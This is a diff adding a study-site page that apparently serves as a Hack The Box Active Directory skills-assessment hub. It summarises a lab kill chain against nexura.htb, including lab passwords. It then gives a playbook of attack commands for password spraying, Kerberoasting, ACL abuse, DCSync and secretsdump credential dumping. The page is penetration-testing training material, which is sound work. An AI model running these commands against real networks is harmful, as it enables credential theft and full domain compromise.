@@ -1,0 +1,108 @@
+---
+title: "AD Enumeration & Attacks: Skills Assessment Hub"
+sidebarTitle: "AD skills assessment"
+description: "Active Directory Module #13 Skills Assessment Part 1 (nexura.htb worked walkthrough) and Part 2 operational execution playbook."
+keywords: ["ad skills assessment", "nexura.htb", "active directory assessment", "part 1", "part 2", "dcsync", "bloodhound"]
+boost: 2
+---
+
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
+
+{/* Generated from Active Directory/AD Skills Assessment.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+The **HTB CPTS Module #13 (Active Directory Enumeration & Attacks)** concludes with a two-part multi-host Skills Assessment. This hub connects your completed **Part 1 (`nexura.htb`)** full walkthrough directly into the Active Directory study path and provides a structured operational playbook and evidence checklist for **Part 2**.
+
+---
+
+## Part 1: Worked End-to-End AD Attack Path (`nexura.htb`)
+
+<Tip>
+**Complete Part 1 Walkthrough Captured**
+
+Your full end-to-end solution, command transcript, and troubleshooting lessons for **AD Skills Assessment Part 1 (`nexura.htb`)** are documented in **[AD Attack Path — Worked Example (`nexura.htb`)](/cheatsheets/ad-attack-path-worked-example)**.
+</Tip>
+
+### Part 1 Kill-Chain Summary (`nexura.htb`)
+
+| Stage | Vantage Point / Identity | Technique & Tooling | Outcome / Next Pivot |
+| --- | --- | --- | --- |
+| **1. OSINT & User List** | External Kali | Employee name harvesting + `namebuster` / `username-anarchy` | Generated valid corporate username candidates |
+| **2. DMZ Foothold** | External → `DMZ01` (`SSH`) | Password spray (`Texas123!@#`) via `hydra` | Authenticated SSH shell as `jbetty` on dual-homed Linux DMZ host |
+| **3. Local Credential Loot** | `DMZ01` (`jbetty`) | Local file & history enumeration | Recovered domain credentials for `hwilliam` (`dealer-screwed-gym1`) |
+| **4. Internal Pivot** | `Kali ↔ DMZ01 → 172.16.119.0/24` | [Ligolo-ng](/pivoting/ligolo) TUN route / [Chisel](/pivoting/chisel) reverse SOCKS5 | Routed access to internal AD subnet `172.16.119.0/24` (`DC01`, `MS01`, `WS01`) |
+| **5. Lateral Movement** | `hwilliam` → `bdavid` | Internal SMB/local admin check (`nxc smb`) + credential hunting | Compromised `bdavid` with read access to `HR` share |
+| **6. Share Looting & Cracking** | `bdavid` on `\\172.16.119.10\HR` | `nxc smb --get-file 'Archive\Employee-Passwords_OLD.psafe3'` + `pwsafe2john` + `john` | Cracked PasswordSafe vault → recovered `stom` credentials (`calves-warp-learning1`) |
+| **7. ACL / DCSync Compromise** | `stom` → `DC01` (`172.16.119.11`) | BloodHound / `bloodyAD` ACL check → `impacket-secretsdump` DCSync | Extracted `Administrator` NT hash and achieved full Domain Admin on `DC01` |
+
+- **[Open the full Part 1 Worked Walkthrough →](/cheatsheets/ad-attack-path-worked-example)**
+
+---
+
+## Part 2: AD Skills Assessment Part 2 Playbook & Checklist
+
+When executing **AD Skills Assessment Part 2** (which starts from an initial foothold or web/RDP entry point and chains internal AD enumeration, privilege escalation, ACL/delegation/certificate or trust abuse to compromise the target domain), follow this structured execution sequence:
+
+### Step 1: Entry Host Foothold & Local Enumeration
+
+```powershell
+# Confirm current identity, token privileges, and network interfaces
+whoami /all
+ipconfig /all
+route print
+netstat -ano
+```
+
+- Sweep for local credentials, PowerShell transcripts/history, scheduled tasks, web root configs (`C:\inetpub\wwwroot\`), and saved credentials (`cmdkey /list`).
+- If landing on a Linux or DMZ host first, establish a [Ligolo-ng](/pivoting/ligolo) tunnel into the internal AD subnet and point `/etc/hosts` at the internal Domain Controller.
+
+### Step 2: Domain Discovery & BloodHound Collection
+
+```bash
+# From Kali through the tunnel:
+nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD'
+nxc smb DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --users --groups --pass-pol
+bloodhound-ce-python -d DOMAIN_FQDN -u USER -p 'PASSWORD' -ns DC_IP -c All --zip --dns-tcp
+```
+
+```powershell
+# Or from a domain-joined Windows shell:
+.\SharpHound.exe -c All --zipfilename ad-part2.zip
+```
+
+### Step 3: Systematic AD Escalation Triage
+
+Check each of these five core AD attack primitives against your current identity and groups:
+
+1. **Readable Shares & SYSVOL Scripts:**
+   - `nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD' -M spider_plus`
+2. **Kerberoasting & AS-REP Roasting:**
+   - `impacket-GetUserSPNs 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile part2-kerb.hash`
+   - `impacket-GetNPUsers 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -format hashcat -outputfile part2-asrep.hash`
+3. **Outbound Object Control (ACL Abuse Chain):**
+   - In BloodHound, check **Transitive Object Control** from your owned principals, or run:
+
+```bash
+bloodyAD --host DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
+```
+
+   - Follow the exact ACL primitive in [ACL Abuse Quick Reference](/active-directory/acl-abuse) (`ForceChangePassword`, `AddMember`, `GenericWrite` SPN/Shadow Credentials, `WriteDACL`, `ReadGMSAPassword`).
+4. **Kerberos Delegation & Coercion:**
+   - Check for computers/users with **Unconstrained Delegation** (`trustedforauth`) or **Constrained / RBCD Delegation** ([Kerberos Delegation Quick Reference](/active-directory/delegation)).
+5. **DomainController / Admin Session Compromise:**
+   - Once an account with local admin on a member server or DC is compromised, dump LSASS / SAM / NTDS (`impacket-secretsdump`) and authenticate to the DC via `evil-winrm` or `impacket-psexec` to retrieve the final assessment flags.
+
+---
+
+## Related Active Directory References
+
+- [Active Directory Study Index (Lessons 01–28)](/active-directory/index)
+- [AD Enumeration Command Reference](/active-directory/command-reference)
+- [AD Enumeration Methodology](/active-directory/methodology)
+- [AD Troubleshooting & Kerberos Fixes](/active-directory/troubleshooting)
+- [BloodHound Complete Guide](/cheatsheets/bloodhound-complete-guide)
